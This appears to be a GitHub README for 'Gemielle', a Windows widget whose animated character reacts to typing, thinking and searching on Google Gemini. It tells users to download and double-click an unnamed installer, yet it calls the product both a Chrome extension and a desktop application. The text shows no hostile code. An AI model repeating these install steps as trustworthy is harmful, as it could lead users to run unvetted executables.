# 🌸 Gemielle - An Interactive Gemini AI Widget

[Download Gemielle Here](https://github.com/Yunus1960/Gemielle)

Gemielle adds a character to your screen. This character reacts to your work on Google Gemini. It changes expressions while you type or wait for answers. It makes using Gemini more fun.

## ⚙️ How It Works

Gemielle watches your interactions on the Gemini website. It uses five different expressions to show how the AI feels. When you type a question, the character shows interest. When the AI searches the web or writes a long answer, the character reacts to these actions. You can move the character anywhere on your browser screen by clicking and dragging it with your mouse.

## 🚀 Getting Started

Follow these steps to install Gemielle on your Windows computer.

1. Go to the [Gemielle download page](https://github.com/Yunus1960/Gemielle).
2. Look for the release section on the right side of the page.
3. Click the latest version link.
4. Download the installation file.
5. Open the folder where you saved the file.
6. Double-click the file to start the installation.
7. Follow the prompts on your screen to finish the setup.

## 🖼️ Understanding the States

Gemielle uses five states to communicate with you:

- Idle: The character waits for your input.
- Typing: The character watches you write a prompt.
- Thinking: The character shows patience while the AI processes data.
- Searching: The character looks active while the AI checks the web.
- Finishing: The character shows satisfaction when the answer is ready.

## 🛠️ System Requirements

Your computer needs these to run Gemielle:

- Windows 10 or Windows 11.
- Google Chrome browser.
- A stable internet connection.
- 50 MB of free storage space.

## 🔧 Troubleshooting

If Gemielle does not show up, try these steps:

1. Refresh your browser page.
2. Ensure you are on the official Google Gemini website.
3. Restart your Chrome browser.
4. Check if the extension is enabled in your browser settings.

If the character freezes, click and drag it to a new position. This often resets the animation. If problems persist, restart the application from your desktop shortcut.

## 📈 Tips for Best Use

Place the character in a corner where it does not hide the text. You can move it whenever you need to see the screen better. Use the character as a visual cue to know when the AI finishes its tasks. This saves you from staring at the loading bar.

Gemielle works best when you keep the Gemini tab open. If you open many tabs, the character might hide behind other windows. Keep your Gemini tab as your active window to see the character at all times.
